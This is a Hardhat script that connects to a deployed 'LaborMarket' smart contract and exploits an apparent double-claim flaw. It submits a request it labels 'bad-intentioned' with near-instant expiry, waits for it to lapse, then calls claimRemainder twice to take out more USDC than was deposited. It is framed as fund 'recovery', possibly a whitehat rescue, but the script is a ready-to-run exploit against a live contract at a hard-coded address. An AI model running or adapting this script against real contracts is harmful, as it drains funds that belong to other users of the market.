const hre = require('hardhat');
const { expect } = require('chai');
const { ethers } = require('hardhat');

async function getCurrentBlockTimestamp() {
    return hre.ethers.provider.getBlock('latest').then((block: any) => block.timestamp);
}

async function main() {
    const [deployer] = await ethers.getSigners();

    const balance = ethers.utils.formatEther(await deployer.getBalance());
    const chainId = hre.network.config.chainId;

    const marketAddress = "0x694e7835c7f5cbcc35d6874c3705c4f7887a17c5"
    const initialRequestId = "2470391136335747024449062217417706681045393155067623785530"

    console.table({
        'Deployer': deployer.address,
        'Chain ID': chainId,
        'Balance': balance,
        'Market Address': marketAddress,
        'Initial Request ID': initialRequestId
    });

    // Connect to the labor market at the marketAddress
    const market = await ethers.getContractAt("LaborMarket", marketAddress);

    // USDC
    const providerTokenAddress = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
    const providerTokenTotal = ethers.BigNumber.from(1000).mul(ethers.BigNumber.from(10).pow(6));
    const reviewerTokenAddress = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
    const reviewerTokenTotal = ethers.utils.parseEther('0');

    // approve the market to spend the tokens
    const providerToken = await ethers.getContractAt("IERC20", providerTokenAddress);
    const providerTokenBalance = await providerToken.balanceOf(deployer.address)
    
    const ready = providerTokenBalance.gte(providerTokenTotal)

    console.table({
        'Provider token balance': providerTokenBalance.toString(),
        'Provider token total': providerTokenTotal.toString(),
        'Ready to go': ready
    })

    if(!ready) {
        console.log('Not enough tokens to proceed...')
        return
    }

    // await providerToken.connect(deployer).approve(marketAddress, providerTokenTotal);
    // console.log('Approved the market to spend the tokens...')

    let now = await getCurrentBlockTimestamp();

    // Deploy a bad-intentioned request with 100:100
    let recoveryRequest = {
        signalExp: now + 30, // uint48
        submissionExp: now + 31, // uint48
        enforcementExp: now + 32, // uint48
        providerLimit: 1, // uint64
        reviewerLimit: 1, // uint64
        pTokenProviderTotal: providerTokenTotal, // uint256
        pTokenReviewerTotal: reviewerTokenTotal, // uint256
        pTokenProvider: providerTokenAddress, // IERC20
        pTokenReviewer: reviewerTokenAddress, // IERC20
    }; 

    let tx = await market.submitRequest(0, recoveryRequest, 'dev://');
    let receipt = await tx.wait();
    const recoveryRequestId = receipt.events.find((e: any) => e.event === 'RequestConfigured').args.requestId;

    console.log('Submit recovery request as', recoveryRequestId)

    let pending = true

    while(pending) {
        console.log('Pending to request expiration...')

        // Make sure every request has been given a failing grade.
        const {
            providers, reviewers, providersArrived, reviewersArrived
        } = await market.connect(deployer).requestIdToSignalState(recoveryRequestId);

        console.table({ 
            'Providers': providers.toString(),
            'Reviewers': reviewers.toString(),
            'Providers Arrived': providersArrived.toString(),
            'Reviewers Arrived': reviewersArrived.toString()
        });

        if(await getCurrentBlockTimestamp() > now + 40) pending = false

        setTimeout(() => {}, 1000)
    }

    console.log('Recovering base...')

    // Remainder of bad request id claimed.
    await market.claimRemainder(recoveryRequestId);

    console.log('Recovering remaining...')

    // Remainder of bad request is claimed again.
    await market.claimRemainder(recoveryRequestId);

    console.log('Recovered all the funds...')
}

main();
